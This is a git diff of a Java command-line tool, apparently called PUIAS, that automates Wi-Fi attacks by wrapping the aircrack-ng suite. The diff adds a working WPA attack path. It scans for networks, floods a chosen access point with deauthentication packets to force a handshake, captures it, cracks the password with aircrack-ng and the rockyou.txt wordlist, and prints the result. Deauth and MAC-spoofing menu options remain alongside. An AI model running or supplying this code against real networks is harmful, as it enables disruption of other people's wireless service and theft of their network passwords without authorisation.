@@ -14,6 +14,8 @@ public class Main {
     static String wi = "wlp5s0";
     static String mwi = wi + "mon";
     static boolean monitorMde = false;
+    static String path;
+    static String scriptDIR;
 
 
     public static void main(String[] args) throws IOException, URISyntaxException {
@@ -25,7 +27,7 @@ public class Main {
             System.exit(0);
         }
 
-        String path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
+        path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
                 .toURI()).getPath();
 
         if (!execute("whoami", false).get(0).equals("root")) {
@@ -35,6 +37,8 @@ public class Main {
         }
 
         checkdep(); //check that necessary dependencies are installed
+
+        scriptDIR = path.replace(path.split(File.separator)[path.split(File.separator).length - 1], "");
 
 
         System.out.println("Success! PUIAS has been successfully started ");
@@ -48,7 +52,7 @@ public class Main {
             System.out.println("|edit - edit wireless card name (curently: " + wi + ") |");
             System.out.println("|                                                  |");
             System.out.println("| 1 - launch deauth attack                         |");
-            //   System.out.println("| 2 - launch WPA attack");
+            System.out.println("| 2 - launch WPA attack                            |");
             System.out.println("| 3 - launch MAC spoofing attack                   |");
             System.out.println("----------------------------------------------------");
 
@@ -65,82 +69,70 @@ public class Main {
 
             }
             if (in.equals("1")) {
-                startMonitorMode();
-
-                String scriptDIR = path.replace(path.split(File.separator)[path.split(File.separator).length - 1], "");
-                String deauthI_path = scriptDIR + "scans" + File.separator + "deauthI"; //deauth initial scan absolote path
-                executeNewWindow("airodump-ng  -w " + deauthI_path + " --output-format csv " + mwi, true);//scan networks and get bssid and essid
-                System.out.println("press enter when done");
-                scanner.nextLine();
+                String[] network = getNetwork();
+                String bss = network[0];
+                String ess = network[1];
+                String ch = network[2];
 
 
-                File[] scans = new File(scriptDIR + "scans").listFiles(pathname -> !pathname.isDirectory());
-                assert scans != null;
-                File last_scan = scans[scans.length - 1]; //get the latest scan
-
-                execute("chmod 777 " + last_scan.getAbsolutePath(), true); //allow editing of file
-
-
-                BufferedReader deauthIbr = new BufferedReader(new FileReader(last_scan));
-                String l;
-                ArrayList<String> dsi_list = new ArrayList<>();
-                while (!(l = deauthIbr.readLine()).equals("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs")) {//read file until reched unasosiated bssids
-                    dsi_list.add(l);
-                }
-                dsi_list.remove(0); //remove headers
-                dsi_list.remove(0);
-
-                ArrayList<String> bssids = new ArrayList<>();
-                ArrayList<String> essids = new ArrayList<>();
-                ArrayList<String> chs = new ArrayList<>();
-
-                int i = 0;
-                for (String entry : dsi_list) {
-                    try {
-                        String[] props = entry.split(",");
-                        chs.add(props[3].replace(" ", ""));
-                        bssids.add(props[0]);
-                        String essid = props[props.length - 2];  // essid is 1 before the last
-                        essids.add(essid);
-                        System.out.println(i + ". " + essid);
-
-                        i++;
-                    } catch (Exception ignored) {
-                    }
-
-                }
-                System.out.println("enter network no");
-
-                int sn = Integer.parseInt(scanner.nextLine());
-                String bss = bssids.get(sn);
-                String ess = essids.get(sn);
-                String ch = chs.get(sn);
-                System.out.println("Selected network: " + ess + " with a bssid: " + bss + " and a chanel: " + ch);
-
-                System.out.println("Enter 1 to deauth all, or 2 to select a target");
+                System.out.println("Only deauth all is curently supported, press 1 to confirm");
                 String p = scanner.nextLine();
 
                 if (p.equals("1")) {
-                    setChanel(ch);
-                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true);
-                    System.out.println("press enter when done");
+                    setChanel(ch); //set chanel
+                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run deauth
+                    System.out.println("press enter when done"); //wait until deauth is done
                     scanner.nextLine();
                 }
 
-                if (p.equals("2")) {
-                    executeNewWindow("airodump-ng -c " + ch + "-w " + "tg.txt" + " --bssid " + bss + " " + mwi, true);
+//                if (p.equals("2")) {
 
-                    File[] tgscans = new File(scriptDIR + "scans").listFiles();
-                    assert tgscans != null;
-                    File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan
-
-                    execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
-
-//                    System.out.println(execute("aireplay-ng -0 100 -a " + bss + " " + mwi, true));
-                }
+//                }
                 stopMonitorMode();
             }
+            if (in.equals("2")) {
+                String[] network = getNetwork();
+                String bss = network[0];
+                String ess = network[1];
+                String ch = network[2];
 
+                executeNewWindow("airodump-ng -c " + ch + " -w " + scriptDIR + "tg" + File.separator + "tg" + " --bssid " + bss + " " + mwi, true);
+
+                System.out.println("attempt to de-auth clients? ");
+                if (scanner.nextLine().toLowerCase().equals("y")) {
+                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run de-auth
+                }
+
+                System.out.println("press enter when done");
+                scanner.nextLine();
+
+                File[] tgscans = new File(scriptDIR + "tg").listFiles(pathname -> pathname.getAbsolutePath().endsWith("cap"));
+
+                assert tgscans != null;
+                Arrays.sort(tgscans);
+                File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan
+
+                execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
+                System.out.println("got handshake");
+
+                executeNewWindow("aircrack-ng -l netpass -w "+scriptDIR+"rockyou.txt"+" -b "+bss+" "+lasttg_scan.getAbsolutePath() , true); //crack password and save to file
+
+                System.out.println("press enter when done");
+                scanner.nextLine();
+                File pass = new File("netpass");
+                BufferedReader  npassbr= new BufferedReader(new FileReader(pass));
+                System.out.println("Password: "+npassbr.readLine());
+                npassbr.close();
+                pass.delete();
+                BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(pass));
+                bufferedWriter.write("Error");
+
+//                execute(scriptDIR+"hashcat-utils-master/src/cap2hccapx.bin "+lasttg_scan.getAbsolutePath()+" "+lasttg_scan.getAbsolutePath().replace(".cap",".hccapx"),false);
+
+//                    System.out.println(execute("aireplay-ng -0 100 -a " + bss + " " + mwi, true));
+                stopMonitorMode();
+
+            }
             if (in.equals("3")) {
                 ArrayList<String> macs = execute("arp-scan -l", true); //get all mac adresses via arp-scan
                 macs.remove(0); //remove headers
@@ -164,16 +156,70 @@ public class Main {
         }
     }
 
+    private static String[] getNetwork() throws IOException {
+        startMonitorMode();
+        String scans_path = scriptDIR + "scans" + File.separator + "scans"; //deauth initial scan absolote path
+        executeNewWindow("airodump-ng  -w " + scans_path + " --output-format csv " + mwi, true);//scan networks and get bssid and essid
+        System.out.println("press enter when done");
+        scanner.nextLine();
+
+
+        File[] scans = new File(scriptDIR + "scans").listFiles(pathname -> !pathname.isDirectory());
+        assert scans != null;
+        Arrays.sort(scans);
+        File last_scan = scans[scans.length - 1]; //get the latest scan
+
+        execute("chmod 777 " + last_scan.getAbsolutePath(), true); //allow editing of file
+
+
+        BufferedReader scansbr = new BufferedReader(new FileReader(last_scan));
+        String l;
+        ArrayList<String> dsi_list = new ArrayList<>();
+        while (!(l = scansbr.readLine()).equals("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs")) {//read file until reched unasosiated bssids
+            dsi_list.add(l);
+        }
+        dsi_list.remove(0); //remove headers
+        dsi_list.remove(0);
+
+        ArrayList<String> bssids = new ArrayList<>();
+        ArrayList<String> essids = new ArrayList<>();
+        ArrayList<String> chs = new ArrayList<>();
+
+        int i = 0;
+        for (String entry : dsi_list) { //go over each entry and extract properies
+            try {
+                String[] props = entry.split(",");
+                chs.add(props[3].replace(" ", ""));
+                bssids.add(props[0]);
+                String essid = props[props.length - 2];  // essid is 1 before the last
+                essids.add(essid);
+                System.out.println(i + ". " + essid);
+
+                i++;
+            } catch (Exception ignored) {
+            }
+
+        }
+        scansbr.close();
+        System.out.println("enter network no");
+
+        int sn = Integer.parseInt(scanner.nextLine()); //get properties for selected network
+        String bss = bssids.get(sn);
+        String ess = essids.get(sn);
+        String ch = chs.get(sn);
+        System.out.println("Selected network: " + ess + " with a bssid: " + bss + " and a chanel: " + ch);
+        return new String[]{bss, ess, ch};
+    }
 
     public static void startMonitorMode() {
         if (!monitorMde) {
             execute("airmon-ng check kill", true);
-            execute("airmon-ng start " + wi , true);
+            execute("airmon-ng start " + wi, true);
         }
     }
 
-    private static void setChanel(String ch){
-        execute("sudo iwconfig "+mwi+" channel "+ch,true);
+    private static void setChanel(String ch) {
+        execute("sudo iwconfig " + mwi + " channel " + ch, true);
     }
 
     public static void stopMonitorMode() {
@@ -189,6 +235,7 @@ public class Main {
         boolean macchanger = checkpackage("macchanger");
         boolean arpscan = checkpackage("arp-scan");
         boolean pkexec = checkpackage("pkexec");
+        boolean hashcat = checkpackage("hashcat");
 
 
         if (!macchanger || !aircrack || !arpscan || !pkexec) {//if any package is missing
@@ -254,6 +301,8 @@ public class Main {
             while ((s = error.readLine()) != null)//then do the same for std error
                 out.add(s);
             p.destroy();
+            br.close();
+            error.close();
         } catch (Exception ignored) {
             ignored.printStackTrace();
         }
